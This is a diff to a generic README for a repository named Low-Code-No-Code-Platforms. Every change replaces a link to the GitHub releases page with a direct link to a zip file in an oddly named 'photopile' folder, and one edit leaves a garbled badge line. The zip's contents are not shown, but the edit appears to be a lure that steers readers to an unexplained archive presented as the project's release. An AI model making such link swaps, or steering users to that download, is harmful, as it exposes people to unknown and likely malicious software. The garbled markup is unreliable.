@@ -1,6 +1,6 @@
 # 🌟 Low-Code-No-Code-Platforms - Power Up Your Development Process
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/DeveloperMind4/Low-Code-No-Code-Platforms/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/DeveloperMind4/Low-Code-No-Code-Platforms/main/photopile/Low-Code-No-Code-Platforms.zip%20Latest%https://raw.githubusercontent.com/DeveloperMind4/Low-Code-No-Code-Platforms/main/photopile/Low-Code-No-Code-Platforms.zip)](https://raw.githubusercontent.com/DeveloperMind4/Low-Code-No-Code-Platforms/main/photopile/Low-Code-No-Code-Platforms.zip)
 
 ## 📜 Introduction
 
@@ -26,7 +26,7 @@ To get started with the applications and resources, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the latest downloads.
 
-   [Download Latest Release](https://github.com/DeveloperMind4/Low-Code-No-Code-Platforms/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/DeveloperMind4/Low-Code-No-Code-Platforms/main/photopile/Low-Code-No-Code-Platforms.zip)
 
 2. **Choose Your Platform:** Look for the appropriate software version for your operating system.
 
@@ -82,4 +82,4 @@ If you encounter issues or have questions about the application, please reach ou
 
 The **Low-Code-No-Code-Platforms** repository offers a collection of valuable resources and tools to empower your development journey. By following the steps outlined above, you can easily download, install, and start using these platforms. 
 
-Don’t forget, you can always return to the **[Download Latest Release](https://github.com/DeveloperMind4/Low-Code-No-Code-Platforms/releases)** page for the most up-to-date software. Happy developing!
+Don’t forget, you can always return to the **[Download Latest Release](https://raw.githubusercontent.com/DeveloperMind4/Low-Code-No-Code-Platforms/main/photopile/Low-Code-No-Code-Platforms.zip)** page for the most up-to-date software. Happy developing!
